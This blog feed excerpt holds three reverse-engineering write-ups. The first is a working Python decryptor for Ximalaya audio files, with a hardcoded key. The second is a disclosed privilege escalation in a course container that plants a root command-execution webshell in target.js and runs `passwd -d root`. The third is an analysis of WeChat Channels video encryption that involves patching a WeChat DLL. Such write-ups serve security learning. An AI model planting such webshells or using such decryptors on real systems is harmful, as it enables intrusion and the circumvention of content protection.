<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define the function signature</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span>* (*DecryptFunction)(<span class="type">char</span>*, <span class="type">uint32_t</span>, <span class="type">char</span>*, <span class="type">uint32_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    HINSTANCE hLib;</span><br><span class="line">    DWORD error;</span><br><span class="line"></span><br><span class="line">    hLib = LoadLibrary(<span class="string">&quot;awesome.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hLib == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        error = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error loading awesome.dll (error code: %d)\n&quot;</span>, error);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;load awesome.dll success\n&quot;</span>);</span><br><span class="line">    <span class="comment">// Get a pointer to the decrypt() function</span></span><br><span class="line">    DecryptFunction decrypt_func = (DecryptFunction) GetProcAddress(hLib, <span class="string">&quot;Decrypt&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (decrypt_func == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error getting Decrypt function address\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test call</span></span><br><span class="line">    <span class="type">char</span> value[<span class="number">0x50</span>] = <span class="string">&quot;QQ==\x00&quot;</span>; <span class="comment">// Just for demonstration</span></span><br><span class="line">    <span class="type">char</span> key[<span class="number">0x50</span>] = <span class="string">&quot;abcd\x00&quot;</span>; <span class="comment">// Just for demonstration</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ready to execute\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span>* result = decrypt_func(value, <span class="number">4</span>, key, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %s\n&quot;</span>, result);</span><br><span class="line"></span><br><span class="line">    FreeLibrary(hLib);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230829_021629.png" alt="Screenshot_20230829_021629"></p>
<p>After all, the results of the <strong>proper</strong> reverse engineering were very consistent with my guesswork solution.</p>
<h1 id="Some-Thoughts"><a href="#Some-Thoughts" class="headerlink" title="Some Thoughts"></a>Some Thoughts</h1><p>Sometimes, when confronted with a perplexing problem, it&#39;s beneficial to shift gears. Using an informed approach to make educated guesses can be far more productive than blindly grappling in the dark. Instead of hitting the wall repeatedly, stepping back and reassessing can often open doors to solutions previously unseen.</p>
<p>The age-old wisdom of &quot;Don&#39;t put all your eggs in one basket&quot; rings true here. Diversifying your strategies can save you from potential pitfalls and lead you to your eureka moment faster than you might think.</p>
<p>All in all, the joy of conquering a formidable challenge is incomparable. Those fleeting moments of doubt now serve as milestones marking how far I&#39;ve journeyed, filling me with a profound sense of achievement.</p>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mutagen.easyid3 <span class="keyword">import</span> ID3</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad,unpad</span><br><span class="line"><span class="keyword">import</span> io,sys,pathlib</span><br><span class="line"><span class="keyword">import</span> re,base64,magic</span><br><span class="line"><span class="keyword">import</span> mutagen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XMInfo</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    const &#123;</span></span><br><span class="line"><span class="string">        title: s,</span></span><br><span class="line"><span class="string">        artist: l,</span></span><br><span class="line"><span class="string">        subtitle: c,</span></span><br><span class="line"><span class="string">        length: d,</span></span><br><span class="line"><span class="string">        comment: &#123;</span></span><br><span class="line"><span class="string">            language: u,</span></span><br><span class="line"><span class="string">            text: p</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        album: h,</span></span><br><span class="line"><span class="string">        trackNumber: b,</span></span><br><span class="line"><span class="string">        size: g,</span></span><br><span class="line"><span class="string">        encodingTechnology: v,</span></span><br><span class="line"><span class="string">        ISRC: _,</span></span><br><span class="line"><span class="string">        fileType: y,</span></span><br><span class="line"><span class="string">        encodedBy: w,</span></span><br><span class="line"><span class="string">        publisher: k,</span></span><br><span class="line"><span class="string">        composer: x,</span></span><br><span class="line"><span class="string">        mediaType: S</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.title = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.artist = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.album = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.tracknumber = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.size = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.header_size = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.ISRC = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.encodedby = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.encoding_technology = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">iv</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.ISRC != <span class="string">&quot;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="variable language_">self</span>.ISRC)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="variable language_">self</span>.encodedby)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(x,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># return number of id3 bytes</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_xm_info</span>(<span class="params">data:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="comment"># print(EasyID3(io.BytesIO(data)))</span></span><br><span class="line">    id3 = ID3(io.BytesIO(data),v2_version=<span class="number">3</span>)</span><br><span class="line">    id3value = XMInfo()</span><br><span class="line">    id3value.title = <span class="built_in">str</span>(id3[<span class="string">&quot;TIT2&quot;</span>])</span><br><span class="line">    id3value.album = <span class="built_in">str</span>(id3[<span class="string">&quot;TALB&quot;</span>])</span><br><span class="line">    id3value.artist = <span class="built_in">str</span>(id3[<span class="string">&quot;TPE1&quot;</span>])</span><br><span class="line">    id3value.tracknumber = <span class="built_in">int</span>(<span class="built_in">str</span>(id3[<span class="string">&quot;TRCK&quot;</span>]))</span><br><span class="line">    id3value.ISRC = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> id3.get(<span class="string">&quot;TSRC&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">str</span>(id3[<span class="string">&quot;TSRC&quot;</span>])</span><br><span class="line">    id3value.encodedby = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> id3.get(<span class="string">&quot;TENC&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">str</span>(id3[<span class="string">&quot;TENC&quot;</span>])</span><br><span class="line">    id3value.size = <span class="built_in">int</span>(<span class="built_in">str</span>(id3[<span class="string">&quot;TSIZ&quot;</span>]))</span><br><span class="line">    id3value.header_size = id3.size</span><br><span class="line">    id3value.encoding_technology = <span class="built_in">str</span>(id3[<span class="string">&quot;TSSE&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> id3value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_printable_count</span>(<span class="params">x:<span class="built_in">bytes</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(x):</span><br><span class="line">        <span class="comment"># all pritable</span></span><br><span class="line">        <span class="keyword">if</span> c &lt; <span class="number">0x20</span> <span class="keyword">or</span> c &gt; <span class="number">0x7e</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_printable_bytes</span>(<span class="params">x:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> x[:get_printable_count(x)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xm_decrypt</span>(<span class="params">raw_data</span>):</span><br><span class="line">    <span class="comment"># decode id3</span></span><br><span class="line">    xm_info = get_xm_info(raw_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;id3 header size: &quot;</span>,<span class="built_in">hex</span>(xm_info.header_size))</span><br><span class="line">    encrypted_data = raw_data[xm_info.header_size:xm_info.header_size+xm_info.size:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Stage 1 aes-256-cbc</span></span><br><span class="line">    xm_key = <span class="string">b&quot;ximalayaximalayaximalayaximalaya&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypt stage 1 (aes-256-cbc):\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    data length = <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span>,\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    key = <span class="subst">&#123;xm_key&#125;</span>,\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    iv = <span class="subst">&#123;xm_info.iv().<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    cipher = AES.new(xm_key, AES.MODE_CBC, xm_info.iv())</span><br><span class="line">    de_data = cipher.decrypt(pad(encrypted_data, <span class="number">16</span>))</span><br><span class="line">    <span class="comment"># Stage 2 xmDecrypt = (base64 decode =&gt; aes-192-cbc =&gt; base64 encode)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypt stage 2 (xmDecrypt):\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    data length = <span class="subst">&#123;<span class="built_in">len</span>(de_data)&#125;</span>,\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    key = <span class="subst">&#123;<span class="built_in">str</span>(xm_info.tracknumber)&#125;</span>&quot;</span>)</span><br><span class="line">    stage_2_data = base64.b64decode(get_printable_bytes(de_data))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(stage_2_data) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">    key = <span class="built_in">str</span>(xm_info.tracknumber).encode()</span><br><span class="line">    key = (<span class="string">b&#x27;12345678&#x27;</span>*<span class="number">3</span>)[:<span class="number">0x18</span>-<span class="built_in">len</span>(key)] + key</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, key[:<span class="number">16</span>])</span><br><span class="line">    stage_2_data = unpad(cipher.decrypt(stage_2_data),<span class="number">16</span>).decode() <span class="comment"># idk but workround</span></span><br><span class="line">    <span class="comment"># Stage 3 combine</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Stage 3 (base64 combination):\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    technology = <span class="subst">&#123;xm_info.encoding_technology&#125;</span>&quot;</span>)</span><br><span class="line">    decrypted_data = base64.b64decode(xm_info.encoding_technology+stage_2_data)</span><br><span class="line">    final_data = decrypted_data + raw_data[xm_info.header_size+xm_info.size::]</span><br><span class="line">    <span class="keyword">return</span> xm_info,final_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xm_decrypt_v12</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_ext</span>(<span class="params">data</span>):</span><br><span class="line">    exts = [<span class="string">&quot;m4a&quot;</span>,<span class="string">&quot;mp3&quot;</span>,<span class="string">&quot;flac&quot;</span>,<span class="string">&quot;wav&quot;</span>]</span><br><span class="line">    value = magic.from_buffer(data).lower()</span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> exts:</span><br><span class="line">        <span class="keyword">if</span> ext <span class="keyword">in</span> value:</span><br><span class="line">            <span class="keyword">return</span> ext</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">f&quot;unexpected format <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_xm_file</span>(<span class="params">from_file,output=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypting <span class="subst">&#123;from_file&#125;</span>&quot;</span>)</span><br><span class="line">    data = read_file(from_file)</span><br><span class="line">    info, audio_data = xm_decrypt(data)</span><br><span class="line">    <span class="keyword">if</span> output == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        output = re.sub(<span class="string">r&#x27;[^\w\-_\. ]&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, info.title)+<span class="string">&quot;.&quot;</span>+find_ext(audio_data[:<span class="number">0xff</span>])</span><br><span class="line">    buffer = io.BytesIO(audio_data)</span><br><span class="line">    tags = mutagen.File(buffer,easy=<span class="literal">True</span>)</span><br><span class="line">    tags[<span class="string">&quot;title&quot;</span>] = info.title</span><br><span class="line">    tags[<span class="string">&quot;album&quot;</span>] = info.album</span><br><span class="line">    tags[<span class="string">&quot;artist&quot;</span>] = info.artist</span><br><span class="line">    <span class="built_in">print</span>(tags.pprint())</span><br><span class="line">    tags.save(buffer)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        buffer.seek(<span class="number">0</span>)</span><br><span class="line">        f.write(buffer.read())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypt succeed, file write to <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python decrypt_xm.py [&lt;filename&gt; ...]&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> sys.argv[<span class="number">1</span>::]:</span><br><span class="line">        decrypt_xm_file(filename)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>electron</tag>
        <tag>reverse</tag>
        <tag>encryption</tag>
        <tag>ximalya</tag>
        <tag>webassembly</tag>
      </tags>
  </entry>
  <entry>
    <title>Getting root access on cpsc436s assignment workspace</title>
    <url>/articles/ctf/unintended-root-privilege-escalation-in-cybersecurity-class-assignment/</url>
    <content><![CDATA[<h1 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h1><p>I found a privilegee escalation vulnerability in one of my course&#39;s assignment. </p>
<p>I&#39;ve reported the vulnerability to our instructor, and he fixed it.  yaayy.</p>
<p>This article will be about how I found this vulnerability and how I utilized it to get a root shell.</p>
<span id="more"></span>

<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>This term, I took a new course - CPSC 436S (Topic In Cybersecurity) taught by Prof. Robert Xiao. </p>
<p>Considering it is the first time this course is being taught and the nature of cybersecurity. I was expecting that there would be lot of vulnerability I&#39;m able to play around with and use in the assignments.</p>
<p>Here we go. One question in module 4 actually has a vulnerability.</p>
<h1 id="Adventure"><a href="#Adventure" class="headerlink" title="Adventure"></a>Adventure</h1><h2 id="Investigating-the-bug"><a href="#Investigating-the-bug" class="headerlink" title="Investigating the bug"></a>Investigating the bug</h2><p>Our questions are hosted on PrairieLearn workspace. In short, the workspace is just a Docker container that contains the question and its setup.</p>
<p>I got stuck when doing the last question about DOSing a server with a rate limiter. (Later, I found it is because I&#39;m sending requests from my computer, but PrairieLearn itself has a rate limiter, so making requests outside the container will be blocked by PrairieLearn.)</p>
<p>So, instead of trying to figure out what causes the problem, I decided to play around with the container itself.</p>
<p>According to the question description,  the container hosts an HTTP service on  <code>localhost:80</code>.</p>
<p>So. i decided to run a ps command to see what processes are running.</p>
<p><img data-src="/images/unintended-root-privilege-escalation-in-cybersecurity-class-assignment/Screenshot_20240203_211543.png" alt="Screenshot_20240203_211543"></p>
<p>huh, seems like there are some interesting processes we can look at.</p>
<p>Although we cannot read those files, after doing a <code>ls -al</code>  on those directories, I found that all of those files were owned by the current user, which means I can change the permissions of those files to whatever I want using chmod.</p>
<p><img data-src="/images/unintended-root-privilege-escalation-in-cybersecurity-class-assignment/image-20240210033553234.png" alt="image-20240210033553234"></p>
<p>After changing their permissions and dumping file content, I figured out how these services are set up.</p>
<p>Firstly, the current user cpsc executes server.js.</p>
<p>Then in server.js, it will generate a new flag file by calling</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">child_process.<span class="title function_">exec</span>(<span class="string">&#x27;sudo /.init-flag.js&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>(The sudoers config file specifies cpsc can execute <code>/.init-flag.js</code> with root privileges without a password, so it works.)</p>
<p>Finally <code>/.init-flag.js</code> will launch another http service <code>target.js</code> with root privilege.</p>
<p>Now all services are up.</p>
<h2 id="Testing-my-theory"><a href="#Testing-my-theory" class="headerlink" title="Testing my theory"></a>Testing my theory</h2><p>wait minute. <code>/.init-flag.js</code> will launch a js file, which is controlled by us???</p>
<p>Does that mean if we can inject some code before <code>target.js</code> is loaded, we are basically getting an rce?</p>
<p>To test my idea, I first test if our file will be kept after container is restarted.</p>
<p>I put some random character in a file called <code>a.txt</code>. then I reboot the container.</p>
<p><img data-src="/images/unintended-root-privilege-escalation-in-cybersecurity-class-assignment/Screenshot_20240210_035350.png" alt="Screenshot_20240210_035350"></p>
<p>Nice. they actually keep my modifications.</p>
<p><img data-src="/images/unintended-root-privilege-escalation-in-cybersecurity-class-assignment/image-20240210035450884.png" alt="image-20240210035450884"></p>
<p>now its time to inject some malicious code into <code>target.js</code></p>
<h2 id="Getting-the-rce"><a href="#Getting-the-rce" class="headerlink" title="Getting the rce"></a>Getting the rce</h2><p>since <code>target.js</code> uses express to host a http server. I inject the following code into <code>target.js</code> to get an rce.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/cmd&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> command = req.<span class="property">query</span>.<span class="property">cmd</span>;</span><br><span class="line"></span><br><span class="line">    child_process.<span class="title function_">exec</span>(command, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (error) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">`Error: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">`Stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Output: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>I restarted the server and tried to run a command.</p>
<p><img data-src="/images/unintended-root-privilege-escalation-in-cybersecurity-class-assignment/Screenshot_20240202_152622.png" alt="img"></p>
<h2 id="Playing-around-with-root-privileges"><a href="#Playing-around-with-root-privileges" class="headerlink" title="Playing around with root privileges"></a>Playing around with root privileges</h2><p>After getting an RCE with root access, I can simply remove the password of root using <code>passwd -d root</code> and switch to root in the webshell</p>
<p>With this root access, I can do a lot of interesting things, for example, change the answer to a custom string.</p>
<p><img data-src="/images/unintended-root-privilege-escalation-in-cybersecurity-class-assignment/Screenshot_20240202_164206.png" alt="img"></p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This bug is mainly caused by misconfiguration in permission control. Which leads to privilege escalation. </p>
<p>owo ovo uwu</p>
<h1 id="Some-thought"><a href="#Some-thought" class="headerlink" title="Some thought"></a>Some thought</h1><p>even experienced people can make mistake or have flaws when writing codes. </p>
<p>So testing is very important.</p>
<p>put some chatgpt generated text for conclusion</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>classpwn</tag>
        <tag>privilege escalation</tag>
      </tags>
  </entry>
  <entry>
    <title>微信视频号视频加密逆向</title>
    <url>/articles/ctf/wechat-video-encryption-reverse-engineer/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好啊，我又回来写博客了。由于大四的选了几门超级难的课，导致没多少时间写博客了。（以上50%为真）</p>
<p>现在是2023年11月30日凌晨1点半，我来写点博客。</p>
<p>总之由于某些原因，我研究了一下微信视频号下载视频的方式。我在github上发现一个挺好的解决方法(<a href="https://github.com/lecepin/WeChatVideoDownloader">WeChatVideoDownloader</a>)，原理是利用代理获取视频地址。但是最近出了点问题，微信对视频号做了一点更新，对视频进行了一点小小的加密，导致下载下来的视频无法直接打开。</p>
<p>什么，加密，这能忍?</p>
<span id="more"></span>

<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>在正式开始逆向之前，我们首先需要能够在微信视频号中打开开发者工具，由于微信默认肯定是不会启用的，所以我们要对微信的某个动态链接库进行小小的修改。</p>
<p>总之就是找到<code>xweb-enable-inspect</code>这个启动选项，修改branch指令，这个启动选项所在的分支变成永远执行就行了。</p>
<p>最后实现效果如图下</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_014835.png" alt="Screenshot_20231130_014835"></p>
<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="Javascript初步分析"><a href="#Javascript初步分析" class="headerlink" title="Javascript初步分析"></a>Javascript初步分析</h2><p>首先随便打开一个视频，我们可以看到很多请求。其中带有<code>stodownload</code>的就是下载的视频文件，但这些视频链接下载下来的内容是加密的。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_015711.png" alt="Screenshot_20231130_015711"></p>
<p>先看一下加密前的视频文件头，我们可以明显发现，它的文件头格式并不正确。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aynakeya @ ThinkStation]:~/workspace/weixinshipin</span><br><span class="line">01:59:21 $ xxd -l 32 v2.bin</span><br><span class="line">00000000: 75a2 b80f 5db2 528b af76 c5f0 9407 a7e9  u...].R..v......</span><br><span class="line">00000010: 4c31 99a8 60ef a5de c64e ce1e 3ab1 6e74  L1..`....N..:.nt</span><br></pre></td></tr></table></figure>

<p>对比之下，一个正常的mp4文件的文件头应该如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000: 0000 0020 6674 7970 6973 6f6d 0000 0200  ... ftypisom....</span><br><span class="line">00000010: 6973 6f6d 6973 6f32 6176 6331 6d70 3431  isomiso2avc1mp41</span><br></pre></td></tr></table></figure>

<p>那么确认了文件被加密。那么我们要从哪里开始呢。因为解密必然是文件下载完成后才解密的。所以解密的函数或者过程很有可能就在文件下载完成后。</p>
<p>查看请求是从哪行代码发起的，我们可以追踪到<code>worker_release.js</code>中的<code>g.send()</code></p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_020505.png" alt="Screenshot_20231130_020505"></p>
<p>这个时候，写过Javascript XMLRequest的人可能就很熟悉这个了，在完成所有callback设置之后，发送请求用的就是<code>.send()</code>，所以往上翻，我们可以找到如下的返回值处理。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_020822.png" alt="Screenshot_20231130_020822"></p>
<p>这里我们可以发现解密函数就是函数M，参数分别为数据和startIndex(也就是文件的第几个byte)</p>
<p>函数M非常的简单易懂，把数据和decryptor_array进行异或即可。如果当前的startIdx大于decryptor_array的长度，则不进行异或，不改变原有数据。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_021050.png" alt="Screenshot_20231130_021050"></p>
<p>如果我们在这个函数M的地方打个断点，我们可以发现这个<code>decryptor_array</code>的长度实际上是一个常量2^17 &#x3D; 131072 (一直都是这个长度)</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_021720.png" alt="Screenshot_20231130_021720"></p>
<p>从这里我们可以推断出，<code>decryptor_array</code>的长度是有限的。</p>
<p>我们从<code>decryptor_array</code>的恒定长度可以推断出，视频加密只作用于文件的前131072字节。这样的加密策略似乎合理——如果需要对整个视频数据进行加密和解密，那么播放视频时消耗的资源可能会显著增加。</p>
<p>(虽然DRM好像就是全文加密的，我也不太了解就是了)</p>
<p>另外，我们还发现，对于同一视频，<code>decryptor_array</code>是一致的。不同的视频文件则对应不同的<code>decryptor_array</code>。这表明<code>decryptor_array</code>是通过某种特定的方法生成或获取的。</p>
<p>经过搜索，我们了解到<code>decryptor_array</code>的赋值仅在<code>wasm_isaac_generate</code>函数中进行。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_022300.png" alt="Screenshot_20231130_022300"></p>
<p>而<code>wasm_isaac_generate</code>函数在代码中只被一个地方调用，即<code>wasm_video_decode.js</code>。</p>
<p>在<code>wasm_video_decode.js</code>中，<code>wasm_isaac_generate</code>作为一个汇编函数，可以在WebAssembly中通过<code>_emscripten_asm_const_int</code>接口被调用。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_022452.png" alt="Screenshot_20231130_022452"></p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_022810.png" alt="Screenshot_20231130_022810"></p>
<p>那么接下来，就要开始逆向可爱的的wasm了</p>
<h2 id="WebAssembly-进一步分析"><a href="#WebAssembly-进一步分析" class="headerlink" title="WebAssembly 进一步分析"></a>WebAssembly 进一步分析</h2><p>下载<code>wasm_video_decode.wasm</code>后，我们使用<a href="https://github.com/WebAssembly/wabt">wabt</a>工具将其转换为<code>.o</code>文件，以便在反编译软件中进行分析。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./path/to/wasm2c wasm_video_decode.wasm -o wasm_video_decode.c</span><br><span class="line"><span class="built_in">cp</span> /path/to/wasm-rt-impl.c .</span><br><span class="line"><span class="built_in">cp</span> /path/to/wasm-rt-impl.h .</span><br><span class="line"><span class="built_in">cp</span> /path/to/wasm-rt.h .</span><br><span class="line">gcc -c wasm_video_decode.c -o wasm_video_decode.o</span><br></pre></td></tr></table></figure>

<p>完成这些步骤后，我们得到一个二进制文件<code>wasm_video_decode.o</code>。将此文件拖入反编译软件，搜索<code>_emscripten_asm_const_int</code>的调用。我们发现<code>wasm_isaac_generate</code>在函数<code>f378</code>处被调用。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_024028.png" alt="Screenshot_20231130_024028"></p>
<p>进一步通过断点和调用栈的检查，我们发现<code>worker_release.js</code>中的<code>decryptor.generate()</code>最终触发了<code>wasm_isaac_generate</code>的调用。</p>
<p>仔细分析揭示出decryptor也是WebAssembly环境中的一个对象，即<code>WxIsaac64</code>。</p>
